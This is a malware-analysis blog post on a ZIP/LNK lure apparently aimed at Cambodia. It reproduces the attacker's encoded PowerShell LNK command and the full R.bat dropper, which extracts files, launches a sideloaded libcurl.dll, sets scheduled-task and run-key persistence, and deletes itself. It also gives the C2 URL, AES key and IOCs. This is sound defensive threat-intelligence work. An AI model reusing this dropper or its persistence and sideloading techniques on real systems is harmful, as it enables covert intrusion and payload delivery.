---
title: Unattributed Shellcode Loader Likely Targeting Cambodia
by: dmpdump
tags: cti malware
---

On March 20, 2025, [MalwareHunterTeam](https://x.com/malwrhunterteam/status/1902710467341980017) shared a sample of a ZIP file containing an LNK, uploaded from Cambodia:

![sshot](/assets/images/shellcode_cambodia/mht.png)

The ZIP file is named `CNP_MFA_Meeting_Documents.zip`. It contains an LNK file named `Meeting_Staff_List.lnk` and a hidden folder named `Resources`. This folder contains a ZIP file named `Resources.zip` and a batch file named `R.bat`

![sshot](/assets/images/shellcode_cambodia/zip1.png)


![sshot](/assets/images/shellcode_cambodia/zip2.png)

`Resources.zip` contains the files that are used for the next-stage payload download:

![sshot](/assets/images/shellcode_cambodia/zip3.png)

# Infection chain

When `Meeting_Staff_List.lnk` is executed, it runs a hidden/base64-encoded PowerShell script:

```powershell
 /c pOweRsHeLl.eXe -w 1 -e dABhAHIAIAAtAHgAZgAgACIAQwBOAFAAXwBNAEYAQQBfAE0AZQBlAHQAaQBuAGcAXwBEAG8AYwB1AG0AZQBuAHQAcwAuAHoAaQBwACIAOwAgACYAIAAiAFIAZQBzAG8AdQByAGMAZQBzAFwAUgAuAGIAYQB0ACIA
```

The decoded scripts shows that the LNK simply extracts the contents of the ZIP file and runs `R.bat`.

```batch
tar -xf "CNP_MFA_Meeting_Documents.zip"; & "Resources\R.bat"
```

`R.bat` is a simple batch script that was very likely generated with an LLM. The excessive presence of comments in the code is typically a good indicator of LLM-generated code. This batch script performs the following actions:

* Tries to extract the contents of `Resources.zip` to a newly-created folder `Notepad++` under %AppData% using PowerShell
* If the PowerShell attempt fails, it downloads 7-zip and attempts to extract the contents of `Resources.zip` with it
* Runs `Notepad++.exe`
* Creates a Scheduled Task named `Notepad++` to run every 15 minutes. The Scheduled Task runs `Notepad++.exe`
* Deletes `Resources.zip` and `R.bat`

```batch
@echo off
setlocal

set ResourceZip=%~dp0Resources.zip

:: Destination resources path 
set DropPath=%AppData%\Notepad++

mkdir %DropPath%

set ExecutableFile=%DropPath%\Notepad++.exe

:: Extract resources
powershell -nop -ep bypass -w 1 -command "Expand-Archive -Path '%ResourceZip%' -DestinationPath '%DropPath%' -Force"

:: If extract failed --> Install 7zip (mostly on Windows 7)
if errorlevel 1 (
    :: Define the URL and the output file name
    set "url=https://www.7-zip.org/a/7z2409-x64.exe"
    set "output=7z2409-x64.exe"

    :: Use PowerShell to download the file
    powershell -w hidden -nop -ep bypass -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"

    :: Check if the download was successful
    if exist "%output%" (
        :: Run the installer silently
        "%output%" /S
    ) else (
        exit /b 1
    )

    :: Check if the ZIP file exists and extract it using 7-Zip
    if exist "%ResourceZip%" (
        :: Use 7-Zip to extract the ZIP file
        C:\PROGRA~1\7-Zip\7z.exe x "%ResourceZip%" -o"%DropPath%" -y
        if errorlevel 1 (
            C:\PROGRA~2\7-Zip\7z.exe x "%ResourceZip%" -o"%DropPath%" -y
            exit /b 1
        )
    ) else (
        exit /b 1
    )

    :: Clean up
    del "%output%"
)

:: Run the executable
if exist "%ExecutableFile%" (
    start "" "%ExecutableFile%"
) else (
    exit /b 1
)

:: Define the task name and the command to run
set taskName="Notepad++"
set taskCommand=%APPDATA%\Notepad++\Notepad++.exe  

:: Create the scheduled task
schtasks /create /tn "%taskName%" /tr "%taskCommand%" /sc minute /mo 15 /st 06:00:00 /f

:: Remove self
del /s /a /q /f %ResourceZip%
del /s /a /q /f R.bat

endlocal
```

`Notepad++.exe` is a legitimate version of WinGup for NotePad++. This executable loads the `libcurl.dll`. The threat actor delivered a malicious DLL for DLL Hijacking purposes.

![sshot](/assets/images/shellcode_cambodia/notepimport.png)

The malicious logic in this infection chain is implemented in `libcurl.dll`, loaded and executed in the memory of `Notepad++.exe`. Out of the 4 functions exported by this DLL, only `curl_easy_init` implements some functionality. The DLL strings are decrypted with a simple XOR algorithm using a rolling key. The following Python script can be used to decrypt strings:

```python
def decrypt(data):
    data = bytes.fromhex(data)
    result = bytearray(data)
    xor_key = [0xAA, 0x55]
    
    for i in range(len(result)):
        result[i] ^= xor_key[i % 2]
    
    return result.decode('ascii')

encrypted_str = "C221DE25D96F857AC63CDC308430CB26" #sample encrypted string from the DLL
decrypted = decrypt(encrypted_str)
print("Decrypted String:", decrypted)
```

When the DLL is loaded and `curl_easy_init` is called, a new thread is created that performs the following actions:

* First, it decrytps the string `curl.dll` and uses it to load the library, which is also delivered in the ZIP archive

![sshot](/assets/images/shellcode_cambodia/curldecrypt.png)

* Then, it decrypts strings for curl.dll's exported functions `checkper` and `setper`. First it calls the `checkper` function. If it returns false, it calls `setper`.

![sshot](/assets/images/shellcode_cambodia/export_dec.png)

Reviewing the loaded `curl.dll`, we can see that this is not related to curl. This DLL implements two functions to check and establish persistence via the registry run key - "checkper" stands for "check persistence", and "setper" stands for "set persistence". The value used for persistence is `WinGup`.


![sshot](/assets/images/shellcode_cambodia/checkper.png)

![sshot](/assets/images/shellcode_cambodia/setper.png)

* Next, it deletes `curl.dll` and decrypts the following URL: `https://live.easyboxsync[.]com/resources/gup/notepad`

![sshot](/assets/images/shellcode_cambodia/del_curl_dec_url.png)

* The DLL then performs the following actions:
    * Decrypts a 16 byte key: `oKqlpfBc5dkGuYi8`
    * Downloads a shellcode from the decrypted URL using the `downloader` User-Agent string
    * Decrypts the shellcode using AES (likely AES-128 given the key length) using the Crypto++ library
    * Loads the shellcode 

![sshot](/assets/images/shellcode_cambodia/down_sc.png)

![sshot](/assets/images/shellcode_cambodia/uas.png)

Unfortunately, as of this writing, I have not been able to obtain the next-stage encrypted shellcode to continue the analysis. Various elements of the infection chain suggest that this is targeted activity, including the lures, the techniques, and the attempts to clean up traces. The Virus Total upload dates and the likely compilation times suggest that this recent activity, with `libcurl.dll` and `curl.dll` having close timestamps.

`libcurl.dll` metadata:

![sshot](/assets/images/shellcode_cambodia/libcurl_time.png)

`curl.dll` metadata:

![sshot](/assets/images/shellcode_cambodia/curl_time.png)

While we don't have a PDB path from the `libcurl.dll`, we can still get a path from the use of the Crypto++ libraries in the development environment:

![sshot](/assets/images/shellcode_cambodia/pdb.png)

`easyboxsync[.]com` is behind Cloudflare:

![sshot](/assets/images/shellcode_cambodia/dns.png)

This domain used for the payload download is relatively recent:

![sshot](/assets/images/shellcode_cambodia/domain.png)

# IOCs
* Domain: https://live.easyboxsync[.]com/resources/gup/notepad
* CNP_MFA_Meeting_Documents.zip: a2c128fc040ed2db7634134f0577b3267164b71f692fc9b37c08e48b168d89e6
* Meeting_Staff_List.lnk: 7e0da1399ff99e41493db489159668db566b6b00cd367e770619b774ec515809
* Resources.zip: badd970fab64c072e5ab0a81865de0988c1b12165a076bcdbee8a9cb8e101675
* R.bat: 28ff75c0ac4434cdc4f0b21567ac1f06979c2426f8623d157473ac079bf8792a
* Notepad++.exe: 1f8c7a202ac9f64efbedb420b6160ef4f9852f6ff1aa36abaa64bfb76b142e15
* libcurl.dll: 23d76c49128994d83f878fd08829d003c2ffcd063d03ec7ff1fe4fe41ffb36c3
* curl.dll: 2707ba2dc931da049f70c31b0654714121fac908475dc084cb4ab808f9dd5308